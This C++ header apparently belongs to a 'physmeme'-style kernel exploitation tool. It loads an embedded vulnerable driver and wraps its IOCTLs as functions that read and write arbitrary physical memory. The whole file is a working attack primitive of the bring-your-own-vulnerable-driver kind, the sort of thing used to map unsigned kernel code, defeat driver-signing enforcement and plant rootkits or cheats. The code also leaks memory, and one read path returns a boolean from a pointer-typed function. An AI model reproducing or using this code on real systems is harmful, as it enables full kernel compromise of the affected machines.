#pragma once
#include <windows.h>
#include <cstdint>

#include "../util/util.hpp"
#include "../loadup.hpp"
#include "../raw_driver.hpp"

#define READ_PHYSICAL 0x1111111
#define WRITE_PHYSICAL 0x222222
#define DEVICE_NAME "\\\\.\\DeviceName"

#pragma pack ( push, 1 )
typedef struct inBuffer_ {
	UINT64 Address;
	UINT32 Option;
	UINT32 SizeMultiplier;
} INBUF, * PINBUF;
#pragma pack ( pop )

namespace physmeme
{
	inline std::string drv_key;
	inline HANDLE drv_handle = NULL;

	inline bool load_drv()
	{
		const auto [result, key] =
			driver::load(
				raw_driver,
				sizeof(raw_driver)
			);

		drv_key = key;
		drv_handle = CreateFile(
			DEVICE_NAME,
			GENERIC_READ | GENERIC_WRITE,
			NULL,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		return drv_handle;
	}

	inline bool unload_drv()
	{
		return CloseHandle(drv_handle) && driver::unload(drv_key);
	}

	inline uintptr_t read_kernel_map_fixed( UINT64 physAddr, UINT32 elemCount)
	{

		DWORD bytes_returned = 0;
		SIZE_T dataSize = 1 * elemCount;

		char* buffer = (char*)malloc(16);
		if (!buffer) return FALSE;


		*(UINT64*)(buffer + 0) = physAddr;
		*(UINT32*)(buffer + 8) = 1;
		*(UINT32*)(buffer + 12) = elemCount;

		void* outBuffer = malloc(1 * elemCount);

		BOOL success = DeviceIoControl(
			drv_handle,
			READ_PHYSICAL,
			buffer,
			sizeof(INBUF),
			outBuffer,
			dataSize,
			&bytes_returned,
			NULL
		);

		if (!success || bytes_returned == 0) {

			return NULL;
		}

		return (uintptr_t)outBuffer;
	}

	inline void write_kernel_map_fixed( UINT64 physAddr, UINT32 elemCount, const void* data)
	{

		SIZE_T dataSize = 1 * elemCount;
		SIZE_T totalSize = 16 + dataSize;

		char* buffer = (char*)malloc(totalSize);

		*(UINT64*)(buffer + 0) = physAddr;
		*(UINT32*)(buffer + 8) = 1;
		*(UINT32*)(buffer + 12) = elemCount;
		memcpy(buffer + 16, data, dataSize);


		//printf("[!] \t data to write:\n");
		//util::dump_hex_ascii((BYTE*)data, elemCount);
		//printf("[<] BEFORE WRITING to 0x%llx\n", physAddr);
		//util::dump_hex_ascii((BYTE*)read_kernel_map_fixed(physAddr, elemCount), elemCount);


		DWORD bytes_returned = 0;
		BOOL success = DeviceIoControl(
			drv_handle,
			WRITE_PHYSICAL,
			buffer,
			totalSize,
			NULL,
			0,
			&bytes_returned,
			NULL
		);

		//printf("[>] AFTER WRITING to 0x%llx\n", physAddr);
		//util::dump_hex_ascii((BYTE*)read_kernel_map_fixed(physAddr, elemCount), elemCount);
		//printf("======================================================\n");
		//printf("======================================================\n");

		free(buffer);
		return;
	}
}